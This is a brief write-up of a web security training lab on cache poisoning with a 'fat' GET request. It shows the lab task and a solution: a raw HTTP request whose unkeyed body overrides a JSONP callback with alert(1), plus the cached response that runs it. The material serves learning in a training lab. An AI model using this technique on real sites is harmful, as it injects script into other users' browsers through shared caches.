# [Lab: Web cache poisoning via a fat GET request](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get)

## Lab

This lab is vulnerable to web cache poisoning. It accepts `GET` requests that have a body, but does not include the body in the cache key. A user regularly visits this site's home page using Chrome.

To solve the lab, poison the cache with a response that executes `alert(1)` in the victim's browser.

## "fat" GET request

a GET request with a request body

## Solutions

cache poisoning:

```http
GET /js/geolocate.js?callback=setCountryCookie HTTP/1.1

callback=alert(1)

HTTP/1.1 200 OK
Cache-Control: max-age=35
Age: 0
X-Cache: miss

alert(1)({"country":"United Kingdom"});
```

unkeyed: fat GET body
